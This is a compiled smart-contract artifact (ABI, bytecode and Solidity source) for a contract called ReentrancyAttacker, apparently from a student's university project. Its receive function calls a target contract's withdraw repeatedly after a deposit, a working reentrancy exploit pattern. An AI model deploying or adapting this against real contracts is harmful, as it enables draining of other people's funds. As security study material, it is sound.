{
  "contractName": "ReentrancyAttacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_reentrancy",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "reentrancy",
      "outputs": [
        {
          "internalType": "contract Reentrancy",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610563380380610563833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61044c806101176000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc146100eb578063e11f493e14610102576100e6565b366100e65760005b600a8110156100e45760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161009f91906102ca565b600060405180830381600087803b1580156100b957600080fd5b505af11580156100cd573d6000803e3d6000fd5b5050505080806100dc90610314565b915050610035565b005b600080fd5b3480156100f757600080fd5b5061010061012d565b005b34801561010e57600080fd5b50610117610257565b60405161012491906103d1565b60405180910390f35b6000670de0b6b3a7640000905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101a257600080fd5b505af11580156101b6573d6000803e3d6000fd5b50505050506000670de0b6b3a7640000905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040161022191906103fb565b600060405180830381600087803b15801561023b57600080fd5b505af115801561024f573d6000803e3d6000fd5b505050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b60006102b46102af6102aa8461027b565b61028f565b610285565b9050919050565b6102c481610299565b82525050565b60006020820190506102df60008301846102bb565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061031f82610285565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610351576103506102e5565b5b600182019050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061039761039261038d8461035c565b61028f565b61035c565b9050919050565b60006103a98261037c565b9050919050565b60006103bb8261039e565b9050919050565b6103cb816103b0565b82525050565b60006020820190506103e660008301846103c2565b92915050565b6103f581610285565b82525050565b600060208201905061041060008301846103ec565b9291505056fea264697066735822122079e99d07622fb53011ada220485ad3714b011ecea8540edbcb6c9d852d2ae11964736f6c63430008130033",
  "immutableReferences": {},
  "source": "// ReentrancyAttacker.sol\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./REEnt.sol\";\r\n\r\ncontract ReentrancyAttacker {\r\n    Reentrancy public reentrancy;\r\n\r\n    constructor(address _reentrancy) {\r\n        reentrancy = Reentrancy(_reentrancy);\r\n    }\r\n\r\n    receive() external payable {\r\n        // Call the withdraw function multiple times to simulate reentrancy\r\n        for (uint i = 0; i < 10; i++) {\r\n            reentrancy.withdraw(1 ether);\r\n        }\r\n    }\r\n\r\n    function attack() public {\r\n        // Deposit Ether into Reentrancy\r\n        uint depositAmount = 1 ether;\r\n        reentrancy.deposit{value: depositAmount}();\r\n\r\n        // Withdraw Ether from Reentrancy\r\n        uint withdrawAmount = 1 ether;\r\n        reentrancy.withdraw(withdrawAmount);\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Uni Work 2023-24\\Individual Project\\Smart Contracts\\contracts\\REAtt.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-02-11T15:34:55.714Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}